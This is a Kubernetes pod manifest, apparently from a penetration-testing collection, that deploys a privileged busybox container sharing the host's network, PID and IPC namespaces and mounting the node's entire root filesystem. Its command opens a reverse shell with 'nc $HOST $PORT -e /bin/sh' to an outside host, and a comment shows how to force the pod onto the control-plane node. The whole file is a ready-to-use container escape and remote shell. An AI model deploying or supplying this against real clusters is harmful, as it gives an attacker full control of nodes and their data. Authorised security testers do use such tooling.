###########################################################
## Deploy: kubectl -n [namespace] apply -f pod-everything-allowed-revshell.yaml 
## Access: kubectl -n [namespace] exec -it pod-everything-allowed-revshell -- bash
## Remove: kubectl -n [namespace] delete pod-everything-allowed-revshell
###########################################################
apiVersion: v1
kind: Pod
metadata:
  name: pod-everything-allowed-revshell
  labels:
    app: pentest
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: everything-allowed-revshell
    image: busybox
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
  # Force scheduling of your pod on control plane node by uncommenting this line and changing the name
  #nodeName: k8s-control-plane-node
  volumes:
  - name: noderoot
    hostPath:
      path: /